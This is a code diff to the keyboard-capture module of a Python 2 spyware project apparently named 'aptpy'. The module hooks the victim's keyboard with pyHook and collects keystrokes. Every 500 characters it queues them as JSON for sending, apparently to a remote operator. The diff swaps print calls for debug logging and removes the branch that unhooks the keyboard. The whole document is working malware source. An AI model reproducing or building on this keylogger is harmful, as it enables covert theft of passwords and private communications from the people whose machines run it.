@@ -2,7 +2,7 @@ import pyHook
 import pythoncom
 from abstract import AbstractModule
 from json import dumps
-from thread import start_new_thread
+from logging import getLogger
 
 
 class KeyloggerModule(AbstractModule):
@@ -14,11 +14,12 @@ class KeyloggerModule(AbstractModule):
         self._hooks_manager.KeyDown = self._keydown
 
     def _execute(self):
+        getLogger('aptpy').debug("[KEYLOGGER] Inside _execute function")
+
         if self.cmd.get('cmd') == 'start':
+            getLogger('aptpy').debug("[KEYLOGGER] Starting keylogger loop")
             self._hooks_manager.HookKeyboard()
             pythoncom.PumpMessages()
-        else:
-            self._hooks_manager.UnhookKeyboard()
 
     def _keydown(self, event):
         ignore = [0, 27]
@@ -37,7 +38,7 @@ class KeyloggerModule(AbstractModule):
 
         self._keys += key
 
-        print key
+        getLogger('aptpy').debug("[KEYLOGGER] Got key: " + key)
 
         if len(self._keys) >= 500:
             message = {
@@ -45,7 +46,8 @@ class KeyloggerModule(AbstractModule):
                 "result": self._keys
             }
 
-            print self._keys
+            getLogger('aptpy').debug("[KEYLOGGER] Got keys: " + self._keys)
+
             self.queue_send.put(dumps(message))
             self._keys = ''
 
